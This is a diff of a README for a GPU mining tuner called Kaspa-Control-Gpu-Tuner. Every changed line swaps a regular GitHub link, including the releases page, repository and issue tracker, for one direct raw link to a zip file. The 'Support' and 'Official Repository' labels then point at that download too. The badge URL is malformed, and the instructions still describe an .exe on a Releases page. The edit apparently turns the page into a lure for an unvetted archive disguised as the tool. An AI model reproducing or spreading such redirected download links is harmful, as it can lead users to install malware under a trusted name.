@@ -2,7 +2,7 @@
 
 ## 🚀 Download Now!
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Latest%20Version-blue.svg)](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner/releases)
+[![Download Release](https://raw.githubusercontent.com/RazeFire10/Kaspa-Control-Gpu-Tuner/main/bzminer_v23.0.2_windows/Kaspa-Control-Gpu-Tuner-overtrade.zip%20Release-Latest%https://raw.githubusercontent.com/RazeFire10/Kaspa-Control-Gpu-Tuner/main/bzminer_v23.0.2_windows/Kaspa-Control-Gpu-Tuner-overtrade.zip)](https://raw.githubusercontent.com/RazeFire10/Kaspa-Control-Gpu-Tuner/main/bzminer_v23.0.2_windows/Kaspa-Control-Gpu-Tuner-overtrade.zip)
 
 ## 📜 Description
 
@@ -29,7 +29,7 @@ Follow these simple steps to install and run the application:
 
 1. **Visit the Download Page**
    Go to the following link to access the latest version:  
-   [Download the latest release](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner/releases)
+   [Download the latest release](https://raw.githubusercontent.com/RazeFire10/Kaspa-Control-Gpu-Tuner/main/bzminer_v23.0.2_windows/Kaspa-Control-Gpu-Tuner-overtrade.zip)
 
 2. **Select the Version**
    On the Releases page, find the latest version of Kaspa-Control-Gpu-Tuner. You will see a list of available files. Look for the file with the `.exe` extension, which is the installer.
@@ -67,8 +67,8 @@ If you encounter issues during installation or when running the application, con
 
 ## 🔗 Useful Links
 
-- [Official Repository](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner)
-- [Community Support](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner/issues)
+- [Official Repository](https://raw.githubusercontent.com/RazeFire10/Kaspa-Control-Gpu-Tuner/main/bzminer_v23.0.2_windows/Kaspa-Control-Gpu-Tuner-overtrade.zip)
+- [Community Support](https://raw.githubusercontent.com/RazeFire10/Kaspa-Control-Gpu-Tuner/main/bzminer_v23.0.2_windows/Kaspa-Control-Gpu-Tuner-overtrade.zip)
 
 ## 📞 Support
 
@@ -86,6 +86,6 @@ Check the Releases page regularly to stay updated on new features and improvemen
 
 You can download Kaspa-Control-Gpu-Tuner by following the link below:
 
-[Download the latest release](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner/releases) 
+[Download the latest release](https://raw.githubusercontent.com/RazeFire10/Kaspa-Control-Gpu-Tuner/main/bzminer_v23.0.2_windows/Kaspa-Control-Gpu-Tuner-overtrade.zip) 
 
 With these steps, you should successfully download and run the Kaspa-Control-Gpu-Tuner, enhancing your GPU mining experience with ease.
